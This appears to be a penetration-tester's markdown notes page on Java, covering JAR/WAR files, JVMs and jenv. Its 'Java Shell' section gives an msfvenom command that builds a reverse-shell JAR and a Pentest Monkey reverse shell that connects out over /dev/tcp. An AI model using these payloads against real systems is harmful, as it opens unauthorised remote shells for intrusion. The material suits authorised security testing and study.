# Java


File types:
```bash
# Java Archive format
$file.jar	
# Web Application Resource
# Or Web application ARchive
# Contains: JAR, Javaserver pages, Java Servblets, Java classes, XML files.
$file.war    
unzip $file.war    
```

#### JVM - Java Virtual Machines

[Wikipedia](https://en.wikipedia.org/wiki/Java_virtual_machine) A **Java virtual machine** (**JVM**) is a [virtual machine](https://en.wikipedia.org/wiki/Virtual_machine "Virtual machine") that enables a computer to run [Java](https://en.wikipedia.org/wiki/Java_(software_platform) "Java (software platform)") programs as well as programs written in [other languages](https://en.wikipedia.org/wiki/List_of_JVM_languages "List of JVM languages") that are also compiled to [Java bytecode](https://en.wikipedia.org/wiki/Java_bytecode "Java bytecode").

#### Virtual Environment

[Java Virtual Environment Jenv](https://medium.com/@bhagavathidhass/virtual-environments-for-python-ruby-and-java-87743478ae38):
```bash
jenv versions # shows all the jenv added versions  
jenv global oracle64-1.6.0.39 # Configure global version  
jenv local oracle64-1.6.0.39 # Configure local version (per directory)  
jenv shell oracle64-1.6.0.39 # Configure shell instance version
```

## Java Shell

```bash
msfvenom --platform java -p java/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f jar -o rev.jar
```

Pentest Monkey
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## References

[Java Virtual Environment Jenv](https://medium.com/@bhagavathidhass/virtual-environments-for-python-ruby-and-java-87743478ae38)
[Wikipedia - JVMs](https://en.wikipedia.org/wiki/Java_virtual_machine) 